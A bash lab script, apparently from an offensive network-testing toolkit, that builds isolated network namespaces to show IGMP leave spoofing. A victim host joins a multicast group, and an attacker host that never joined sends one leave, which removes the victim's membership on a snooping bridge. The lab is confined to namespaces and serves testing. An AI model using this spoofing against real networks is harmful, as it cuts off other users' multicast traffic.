#!/usr/bin/env bash
# Isolated IGMP leave spoofing lab (Linux only, needs root).
#
# Topology, all inside network namespaces:
#
#   lan (bridge br0, multicast snooping on) --(p-seg / h-seg veth)-- seg
#   seg (bridge br1, snooping off, acts as a hub) with two hosts behind it:
#     victim:   joins GROUP with a membership report.
#     attacker: never joins GROUP. It sends an IGMP leave for GROUP.
#
# The LAN switch learns memberships per port. Both hosts sit behind the same port (p-seg),
# so the switch sees one membership for the port, and a leave from any host behind it can
# remove it.
#
# Phases:
#   Phase 1 (baseline): the victim joins GROUP. The switch should learn GROUP on p-seg.
#            The membership should stay for several seconds with no leave sent (control).
#   Phase 2 (attack): the attacker sends one leave for GROUP. The switch should remove
#            GROUP from p-seg, which cuts off the victim's membership.
#
# What the lab shows: whether this bridge removes a port's membership on a leave that
# comes from a host that never joined. It does not show vendor leave-handling timers,
# querier behavior or group-specific queries on a real switch. Nothing here touches the
# host's real network interfaces.
#
# Usage:
#   sudo scripts/lab/igmp_leave_spoofing_lab.sh
#
# Requirements: iproute2 (ip, bridge) and the project virtualenv (.venv).
# Override the interpreter with PYTHON=/path/to/python.

set -euo pipefail

if [[ "$(id -u)" -ne 0 ]]; then
    echo "This lab needs root: run it with sudo." >&2
    exit 1
fi

for tool in ip bridge; do
    if ! command -v "$tool" >/dev/null 2>&1; then
        echo "Missing required tool: $tool" >&2
        exit 1
    fi
done

ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
PY="${PYTHON:-$ROOT/.venv/bin/python}"
GROUP="239.1.2.3"
VICTIM_MAC="02:00:00:00:00:10"
VICTIM_IP="10.77.0.10"
ATTACKER_MAC="02:00:00:00:00:20"
ATTACKER_IP="10.77.0.20"
CONTROL_SECONDS=6
MAX_WAIT_SECONDS=8

stop_lab() {
    for ns in lan seg victim attacker; do
        ip netns del "$ns" 2>/dev/null || true
    done
}
trap stop_lab EXIT

stop_lab

ip netns add lan
ip netns add seg
ip netns add victim
ip netns add attacker

# lan <-> seg, the uplink that carries both hosts' traffic to the LAN switch
ip link add p-seg type veth peer name h-seg
ip link set p-seg netns lan
ip link set h-seg netns seg

# seg hosts
ip link add s-vic type veth peer name h-vic
ip link set s-vic netns seg
ip link set h-vic netns victim
ip link add s-atk type veth peer name h-atk
ip link set s-atk netns seg
ip link set h-atk netns attacker

# LAN switch: multicast snooping on, one port toward the segment
ip netns exec lan ip link add br0 type bridge mcast_snooping 1
ip netns exec lan ip link set br0 up
ip netns exec lan ip link set p-seg master br0
ip netns exec lan ip link set p-seg up

# Segment: a hub-like bridge with snooping off, so every host hears all traffic
ip netns exec seg ip link add br1 type bridge mcast_snooping 0
ip netns exec seg ip link set br1 up
for port in h-seg s-vic s-atk; do
    ip netns exec seg ip link set "$port" master br1
    ip netns exec seg ip link set "$port" up
done
ip netns exec seg ip link set lo up

ip netns exec victim ip link set h-vic address "$VICTIM_MAC"
ip netns exec victim ip link set h-vic up
ip netns exec victim ip link set lo up
ip netns exec attacker ip link set h-atk address "$ATTACKER_MAC"
ip netns exec attacker ip link set h-atk up
ip netns exec attacker ip link set lo up

JOIN_CODE='
import os, threading
from macabre.attacks.igmp_spoofing import IgmpSpoofingConfig, run_igmp_spoofing
run_igmp_spoofing(
    IgmpSpoofingConfig(iface="h-vic", source_mac=os.environ["VICTIM_MAC"], groups=(os.environ["GROUP"],),
                       source_ip=os.environ["VICTIM_IP"]),
    threading.Event(),
    lambda _s: None,
)
'

LEAVE_CODE='
import os, threading
from macabre.attacks.igmp_leave_spoofing import IgmpLeaveSpoofingConfig, run_igmp_leave_spoofing
stats = run_igmp_leave_spoofing(
    IgmpLeaveSpoofingConfig(iface="h-atk", source_mac=os.environ["ATTACKER_MAC"], groups=(os.environ["GROUP"],),
                            source_ip=os.environ["ATTACKER_IP"]),
    threading.Event(),
    lambda _s: None,
)
print(stats.leaves)
'

# Prints the switch's membership entries for GROUP on the segment's port (empty when none).
segment_entry() {
    ip netns exec lan bridge mdb show dev br0 2>/dev/null | grep "port p-seg" | grep "grp $GROUP" || true
}

echo "Phase 1: the victim joins $GROUP. Control: no leave is sent for $CONTROL_SECONDS s"
ip netns exec victim env PYTHONPATH="$ROOT/src" VICTIM_MAC="$VICTIM_MAC" VICTIM_IP="$VICTIM_IP" \
    GROUP="$GROUP" "$PY" -c "$JOIN_CODE" >/dev/null 2>&1 || true
sleep 1
JOINED="$(segment_entry)"
if [[ -n "$JOINED" ]]; then
    echo "  membership on the segment's port after the join: $JOINED"
else
    echo "  membership on the segment's port after the join: none"
fi
sleep "$CONTROL_SECONDS"
CONTROL="$(segment_entry)"
if [[ -n "$CONTROL" ]]; then
    echo "  still there after $CONTROL_SECONDS s with no leave: yes"
else
    echo "  still there after $CONTROL_SECONDS s with no leave: no"
fi
echo

echo "Phase 2: the attacker, which never joined $GROUP, sends one IGMP leave for it"
LEAVES="$(ip netns exec attacker env PYTHONPATH="$ROOT/src" ATTACKER_MAC="$ATTACKER_MAC" \
    ATTACKER_IP="$ATTACKER_IP" GROUP="$GROUP" "$PY" -c "$LEAVE_CODE" 2>/dev/null || echo 0)"
echo "  leaves sent: $LEAVES"
REMOVED="no"
WAITED=0
while (( WAITED < MAX_WAIT_SECONDS )); do
    sleep 1
    WAITED=$(( WAITED + 1 ))
    if [[ -z "$(segment_entry)" ]]; then
        REMOVED="yes"
        break
    fi
done
if [[ "$REMOVED" == "yes" ]]; then
    echo "  membership removed from the segment's port after $WAITED s: yes"
else
    echo "  membership removed from the segment's port within $MAX_WAIT_SECONDS s: no"
fi
echo

if [[ -n "$JOINED" && -n "$CONTROL" && "$LEAVES" == "1" && "$REMOVED" == "yes" ]]; then
    echo "Result: the victim's membership stayed for $CONTROL_SECONDS s with no leave. After one leave from a host that never joined the group, the switch removed the group from the port the victim shares with it. Leaves are not checked on this bridge. Vendor leave handling is not tested here."
    exit 0
elif [[ -z "$JOINED" ]]; then
    echo "Result: inconclusive. The join did not create a membership on this kernel, so the leave has nothing to remove. Result unreliable."
    exit 2
else
    echo "Result: the outcome did not match the expected phases. Result unreliable."
    exit 1
fi
